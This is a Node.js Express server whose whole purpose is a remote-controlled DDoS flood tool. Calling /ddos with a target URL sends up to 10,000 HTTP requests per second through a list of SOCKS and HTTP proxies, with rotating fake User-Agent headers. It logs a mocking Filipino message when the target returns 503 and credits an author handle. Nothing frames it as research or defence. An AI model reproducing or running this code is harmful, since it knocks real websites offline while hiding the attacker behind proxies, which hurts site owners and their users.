const express = require('express');
const axios = require('axios');
const SocksProxyAgent = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const fs = require('fs');
const app = express();
const port = 3000;

const proxyF = "proxy.txt";
const userAgents = [
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
    'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
    'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
    'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
    'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
    'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
    'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
    'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413'
];

let continueAttack = false;

function readProxy() {
    try {
        const data = fs.readFileSync(proxyF, "utf8");
        return data.trim().split("\n").map((line) => line.trim());
    } catch (error) {
        console.error(`Failed to read proxy list: ${error}`);
        return [];
    }
}

app.get('/', (req, res) => {
    res.send('how to use? you can use this parameter /url?attack=https://namirz.com, how to stop the attack? /stop');
});

app.get('/ddos', async (req, res) => {
    const { url } = req.query;

    if (!url) {
        return res.status(400).json({ error: 'URL is required.' });
    }

    continueAttack = true;
    let requestCount = 0;
    const maxRequests = 500000000;
    const requestsPerSecond = 10000;
    const proxies = readProxy();

    const attack = () => {
        if (!continueAttack || requestCount >= maxRequests) {
            console.log('Attack stopped or max requests reached.');
            return;
        }

        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const headers = { 'User-Agent': userAgent };

        const makeRequest = (url, headers, agent) => {
            return axios.get(url, { headers, httpAgent: agent })
                .then((response) => {
                    if (response.status === 503) {
                        console.log("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣");
                    } else {
                        console.log(`Status Code: ${response.status}`);
                    }
                    requestCount++;
                })
                .catch((error) => {
                    console.log("Error: " + error.message);
                });
        };

        if (proxies.length > 0) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const proxyParts = proxy.split(":");
            const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
            const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
            const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
            makeRequest(url, headers, agent);
        } else {
            makeRequest(url, headers);
        }

        setTimeout(attack, 1000 / requestsPerSecond);
    };

    attack();
    res.json({ message: 'DDoS attack is starting ', author:'Mr.Azure Whisper PH' });
});

app.get('/stop', (req, res) => {
    continueAttack = false;
    res.json({ message: 'DDoS attack stopped.' });
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Server is running on http://0.0.0.0:${port}`);
});
